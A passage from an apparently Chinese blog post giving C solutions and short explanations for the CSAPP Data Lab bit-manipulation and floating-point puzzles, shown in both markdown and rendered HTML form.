clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目\n- 同样的思路，提取每四位的low bit、high bit，然后相加\n- 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果\n\n### bang\n\n```c\n/*\n * bang - Compute !x without using !\n *   Examples: bang(3) = 0, bang(0) = 1\n *   Legal ops: ~ & ^ | + << >>\n *   Max ops: 12\n *   Rating: 4 \n */\nint bang(int x) {\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn ~x&0x1;\n}\n```\n\n#### 思路\n\n- 如果非0，位模式从最高位的1到最低位都填充为1，\n- 如果为0，则位模式还是保持全0\n\n### tmin\n\n```c\n/* \n * tmin - return minimum two's complement integer \n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void) {\n\treturn 1<<31;\n}\n```\n\n### fitBits\n\n```c\n/* \n * fitsBits - return 1 if x can be represented as an \n *  n-bit, two's complement integer.\n *   1 <= n <= 32\n *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint fitsBits(int x, int n) {\n\treturn !(x>>n+~0)|!((x>>n+~0)+1);\n  //equal to !(x>>n-1) | !((x>>n-1)+1)\n}\n```\n\n#### 思路\n\n- 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。\n\n### divpwr2\n\n```c\n/* \n * divpwr2 - Compute x/(2^n), for 0 <= n <= 30\n *  Round toward zero\n *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint divpwr2(int x, int n) {\n\tint t = x>>31;\n\treturn (x+(t&1<<n)+(~(t&1)+1))>>n;\n  //equal to (x+(t&1<<n)-(t&1))>>n;\n  //note that & 的优先级低于<<\n}\n```\n\n#### 思路\n\n- 直接移位是round down，无论是负数还是正数\n- 所以要实现round to zero , C表达式为`x<0 ? x+(pow(2,n)-1)>>n : x>>n `\n\n### negate\n\n```c\n/* \n * negate - return -x \n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x) {\n\treturn ~x+1;\n}\n```\n\n#### 思路\n\n- 直接取反再加1\n\n### isPositive\n\n```c\n/* \n * isPositive - return 1 if x > 0, return 0 otherwise \n *   Example: isPositive(-1) = 0.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 8\n *   Rating: 3\n */\nint isPositive(int x) {\n\treturn ~(x>>31)&!!x;\n}\n```\n\n#### 思路\n\n- 符号位判断，并且非0\n\n### isLessOrEqual\n\n```c\n/* \n * isLessOrEqual - if x <= y  then return 1, else return 0 \n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y) {\n\treturn !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x+~y+1>>31) | !(x^y);\n\t//equal to  !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x-y>>31) | !(x^y)\n}\n```\n\n#### 思路\n\n- `x<0&&y>0 | !(x>0&&y<0)&&(x-y>0) | x==y`\n\n### ilog2\n\n```c\n/*\n * ilog2 - return floor(log base 2 of x), where x > 0\n *   Example: ilog2(16) = 4\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 90\n *   Rating: 4\n */\nint ilog2(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\tx >>= 1;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 先构造从最高的1到最低位均为1的二进制，然后类似bitCount\n\n### float_neg\n\n```c\n/* \n * float_neg - Return bit-level equivalent of expression -f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representations of\n *   single-precision floating point values.\n *   When argument is NaN, return argument.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 10\n *   Rating: 2\n */\nunsigned float_neg(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tif(t^0x7F800000 && (t>>23)+1>>8)\n\t\treturn uf;\n\telse \n\t\treturn uf^0x80000000;\n}\n```\n\n#### 思路\n\n- 判别是否是NaN。先判断尾数是否全0，然后用`(t>>23)+1>>8`判断exp是否全1\n\n### float_i2f\n\n```c\n/* \n * float_i2f - Return bit-level equivalent of expression (float) x\n *   Result is returned as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point values.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_i2f(int x) {\n    unsigned shiftLeft=0;\n    unsigned afterShift, tmp, flag;\n    unsigned absX=x;\n    unsigned sign=0;\n    //special case\n    if (x==0) return 0;\n    //if x < 0, sign = 1000...,abs_x = -x\n    if (x<0)\n    {\n        sign=0x80000000;\n        absX=-x;\n    }\n    afterShift=absX;\n    //count shift_left and after_shift\n    while (1)\n    {\n        tmp=afterShift;\n        afterShift<<=1;\n        shiftLeft++;\n        if (tmp & 0x80000000) break;\n    }\n    if ((afterShift & 0x01ff)>0x0100)\n        flag=1;\n    else if ((afterShift & 0x03ff)==0x0300)\n        flag=1;\n    else\n        flag=0;\n \n    return sign + (afterShift>>9) + ((159-shiftLeft)<<23) + flag;\n}\n//from http://www.cnblogs.com/tenlee/p/4951639.html\n```\n\n#### 思路\n\n- 分情况处理0、负数、正数\n\n- 要处理舍人\n\n  > - 向接近的舍入\n  > - 如果处于中间，向偶数舍入\n\n- 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的\n\n### float_twict\n\n```c\n/* \n * float_twice - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_twice(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tunsigned temp = t&0x7F800000;\n\tunsigned temp2 = uf&0xFF800000;\n\tint expFull = !(temp^0x7F800000);\n\tif(t^0x7F800000 && expFull)\n\t\treturn uf;\n\tif(expFull){\n\t\treturn temp2;\n\t}\n\tif(!(t&0x7F800000)){\n\t\tunsigned k = (uf&0x7FFFFF);\n\t\treturn temp2+(k<<1);\n\t}\n\treturn (temp>>23)+1<<23 | uf&0x807FFFFF;\n}\n```\n\n#### 思路\n\n- 分情况处理三种IEEE754的情况\n- 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了\n\n","content":"<h1 id=\"CSAPP-data-Lab\"><a href=\"#CSAPP-data-Lab\" class=\"headerlink\" title=\"CSAPP data Lab\"></a>CSAPP data Lab</h1><blockquote>\n<p>注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。</p>\n</blockquote>\n<h3 id=\"bitAnd\"><a href=\"#bitAnd\" class=\"headerlink\" title=\"bitAnd\"></a>bitAnd</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ |</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitAnd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(~x|~y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>德摩根定律</li>\n</ul>\n<h3 id=\"getByte\"><a href=\"#getByte\" class=\"headerlink\" title=\"getByte\"></a>getByte</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * getByte - Extract byte n from word x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 6</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getByte</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> bias = n&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&gt;&gt;bias)&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>移位到最低的1byte然后用0xFF提取</li>\n</ul>\n<h3 id=\"logicalShift\"><a href=\"#logicalShift\" class=\"headerlink\" title=\"logicalShift\"></a>logicalShift</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class=\"line\"><span class=\"comment\">\ti</span></span><br><span class=\"line\"><span class=\"comment\"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 20</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">logicalShift</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">32</span>+~n&lt;&lt;<span class=\"number\">1</span>)+~<span class=\"number\">0</span> &amp; (x&gt;&gt;n);</span><br><span class=\"line\">  <span class=\"comment\">//equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n);</span></span><br><span class=\"line\">  <span class=\"comment\">//负号优先级高于移位</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>因为不能用<code>-</code>，所以用取反加一代替取负</p>\n</li>\n<li><p>构造低<code>32-n</code>bit的1来提取移位后的数值</p>\n</li>\n<li><p>因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位</p>\n<blockquote>\n<p>小技巧，如果n移位k，k$\\in$[0, 32]，则可以<code>n&gt;&gt;(k-!!k)&gt;&gt;!!k</code></p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"bitCount\"><a href=\"#bitCount\" class=\"headerlink\" title=\"bitCount\"></a>bitCount</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bitCount - returns count of number of 1's in word</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 40</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitCount</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目</li>\n<li>同样的思路，提取每四位的low bit、high bit，然后相加</li>\n<li>因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果</li>\n</ul>\n<h3 id=\"bang\"><a href=\"#bang\" class=\"headerlink\" title=\"bang\"></a>bang</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bang - Compute !x without using !</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 12</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bang</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x&amp;<span class=\"number\">0x1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>如果非0，位模式从最高位的1到最低位都填充为1，</li>\n<li>如果为0，则位模式还是保持全0</li>\n</ul>\n<h3 id=\"tmin\"><a href=\"#tmin\" class=\"headerlink\" title=\"tmin\"></a>tmin</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * tmin - return minimum two's complement integer </span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tmin</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"fitBits\"><a href=\"#fitBits\" class=\"headerlink\" title=\"fitBits\"></a>fitBits</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class=\"line\"><span class=\"comment\"> *  n-bit, two's complement integer.</span></span><br><span class=\"line\"><span class=\"comment\"> *   1 &lt;= n &lt;= 32</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitsBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x&gt;&gt;n+~<span class=\"number\">0</span>)|!((x&gt;&gt;n+~<span class=\"number\">0</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"comment\">//equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-5\"><a href=\"#思路-5\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。</li>\n</ul>\n<h3 id=\"divpwr2\"><a href=\"#divpwr2\" class=\"headerlink\" title=\"divpwr2\"></a>divpwr2</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class=\"line\"><span class=\"comment\"> *  Round toward zero</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 15</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">divpwr2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x+(t&amp;<span class=\"number\">1</span>&lt;&lt;n)+(~(t&amp;<span class=\"number\">1</span>)+<span class=\"number\">1</span>))&gt;&gt;n;</span><br><span class=\"line\">  <span class=\"comment\">//equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n;</span></span><br><span class=\"line\">  <span class=\"comment\">//note that &amp; 的优先级低于&lt;&lt;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-6\"><a href=\"#思路-6\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接移位是round down，无论是负数还是正数</li>\n<li>所以要实现round to zero , C表达式为<code>x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n</code></li>\n</ul>\n<h3 id=\"negate\"><a href=\"#negate\" class=\"headerlink\" title=\"negate\"></a>negate</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * negate - return -x </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: negate(1) = -1.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 5</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">negate</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-7\"><a href=\"#思路-7\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>直接取反再加1</li>\n</ul>\n<h3 id=\"isPositive\"><a href=\"#isPositive\" class=\"headerlink\" title=\"isPositive\"></a>isPositive</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: isPositive(-1) = 0.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isPositive</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(x&gt;&gt;<span class=\"number\">31</span>)&amp;!!x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-8\"><a href=\"#思路-8\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>符号位判断，并且非0</li>\n</ul>\n<h3 